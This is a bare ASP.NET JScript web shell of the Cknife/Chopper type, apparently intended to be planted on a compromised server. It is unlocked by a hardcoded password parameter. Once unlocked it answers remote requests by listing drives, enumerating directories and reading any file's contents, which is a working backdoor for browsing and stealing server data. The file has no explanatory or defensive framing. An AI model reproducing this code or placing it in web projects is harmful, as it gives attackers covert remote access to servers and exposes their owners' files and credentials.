<%@ Page Language="Jscript"%><%
var PWD;
var action;
PWD = Request.Item["Cknife"];
action = Request.Item["action"];
if(PWD=="1"){
    Response.Write("->|");
    if(action=="index"){
        var c=System.IO.Directory.GetLogicalDrives();
        Response.Write(Server.MapPath(".")+"");
        Response.Write("\t");
        for(var i=0;i<=c.length-1;i++)
            Response.Write(c[i][0]+":");
    }
    else if(action=="readdict"){   
        var D=Request.Item["z1"];
        var m=new System.IO.DirectoryInfo(D);
        var s=m.GetDirectories();
        var P:String;
        var i;
        function T(p:String):String{
                return System.IO.File.GetLastWriteTime(p).ToString("yyyy-MM-dd HH:mm:ss");
        }
        for(i in s){
            P=D+s[i].Name;Response.Write(s[i].Name+"/\t"+T(P)+"\t0\t-\n");
            }
        s=m.GetFiles();
        for(i in s){
            P=D+s[i].Name;Response.Write(s[i].Name+"\t"+T(P)+"\t"+s[i].Length+"\t-\n");
            }
    }
    else if(action=="readfile"){
        var P=Request.Item["z1"];
        var m=new System.IO.StreamReader(P,Encoding.Default);
        Response.Write(m.ReadToEnd());m.Close();
    }
    Response.Write("|<-");
}

%>


